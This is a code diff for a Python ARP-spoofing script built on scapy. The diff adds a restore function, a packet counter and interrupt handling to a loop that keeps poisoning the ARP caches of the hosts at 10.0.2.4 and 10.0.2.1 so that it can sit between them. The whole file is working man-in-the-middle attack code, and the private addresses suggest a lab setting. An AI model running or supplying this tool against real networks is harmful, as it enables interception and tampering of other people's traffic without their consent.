@@ -2,6 +2,7 @@ import time
 from scapy.all import srp, send
 from scapy.layers.l2 import ARP, Ether
 
+
 def get_mac(ip):
     '''
         Performs ARP scan on target IP or IP range
@@ -21,12 +22,33 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
+    '''
+        Performs ARP spoof on target IP
+
+        Parameters:
+            target_ip - target IP to spoof
+            spoof_ip - IP addr that will be impersonated
+    '''
     target_mac = get_mac(target_ip)
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet)
+    send(packet, verbose=False)
+
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    send(packet, count=4, verbose=False)
 
 if __name__ == "__main__":
+    sent_packets = 0
+
     while True:
-        spoof('10.0.2.4', '10.0.2.1')
-        spoof('10.0.2.1', '10.0.2.4')
-        time.sleep(5)
+        try:
+            spoof('10.0.2.4', '10.0.2.1')
+            spoof('10.0.2.1', '10.0.2.4')
+            sent_packets += 2
+            print(f"\r[+] Packets sent: {sent_packets}", end='', flush=True)
+            time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n[+] Detected Keyboard Interrupt. Quitting...")
+            break
